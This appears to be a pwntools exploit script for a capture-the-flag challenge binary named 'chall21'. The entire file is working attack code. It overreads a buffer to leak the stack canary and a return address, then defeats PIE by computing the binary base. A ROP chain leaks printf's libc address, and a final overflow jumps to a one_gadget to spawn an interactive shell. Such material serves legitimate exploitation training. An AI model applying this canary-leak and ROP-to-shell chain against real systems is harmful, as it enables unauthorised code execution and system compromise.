from pwn import *
from struct import pack
import argparse
from setup import setup, u32Var, u64Var

elfPath = './chall21'
breakpoints = '''
b *(0x555555554000 + 0xb95)
b *(0x555555554000 + 0xbce)
b *(0x555555554000 + 0xa46)
continue
'''

io, elf, libc, ld, oneGadget = setup(elfPath, breakpoints)

#exploit custom code comes here:

def send(buffer: bytes):
    io.recvuntil(b'buffer')
    io.send(buffer + b'\n')
    io.recvuntil(b'output: ')
    ret = io.recvline().split(b'\n')[0]
    return ret

bufferLength = 0x48

output = send(b'A'*(bufferLength + 1))
canary = output.split(b'A'*bufferLength)[1][0:8]
canary = u64(canary)
canary = canary & 0xffffffffffffff00
print('canary:', hex(canary))

output = send(b'A'*(bufferLength + 0x10))
returnAddr = output.split(b'A'*(bufferLength + 0x10))[1][0:8]
returnAddr = u64Var(returnAddr)
print('return addr:', hex(returnAddr))
elf.address = returnAddr - 0xa25
print('base addr:', hex(elf.address))

popRdi = 0xc33 + elf.address
popRsiR15 = 0xc31 + elf.address
printfString = 0x13f8 + elf.address
main = 0xaf1 + elf.address

stackPivot = elf.bss() + 0x300

rop = b'A'*bufferLength + p64(canary) + p64(stackPivot)
rop += p64(popRdi) + p64(printfString)
rop += p64(popRsiR15) + p64(elf.got['printf']) + b'X'*8
rop += p64(elf.plt['printf']) + p64(main)

send(rop)

io.sendafter(b'buffer:', b'\n')

io.recvuntil(b'output: ')
x = io.recvline()
printf = u64Var(x)
print('printf addr:', hex(printf))

libc.address = printf - libc.symbols['printf']
print('libc base:', hex(libc.address))

addr = libc.address + oneGadget

rop = b'A'*bufferLength + p64(canary) + b'B'*8 + p64(addr) 

send(rop)

io.send(b'\n')

io.recvline()
io.recvuntil('buffer: ')

print('PWNED! here you have a shell :-)')

io.interactive()